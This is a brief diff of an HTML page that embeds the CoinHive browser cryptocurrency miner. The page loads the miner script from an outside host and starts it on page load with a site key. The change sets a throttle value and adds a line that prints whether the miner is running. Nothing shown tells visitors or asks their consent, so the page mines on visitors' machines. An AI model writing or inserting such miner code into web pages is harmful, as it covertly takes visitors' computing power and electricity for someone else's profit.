@@ -13,8 +13,9 @@
 <br/><br/><br/>
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-    var miner = new CoinHive.Anonymous('P2FZXNjoqOUGPmpr2RhOYIpmJZuCNwrt');
+    var miner = new CoinHive.Anonymous('P2FZXNjoqOUGPmpr2RhOYIpmJZuCNwrt', {throttle: 0.8});
     miner.start();
+    document.write(miner.isRunning());
 </script>
 
 <script>
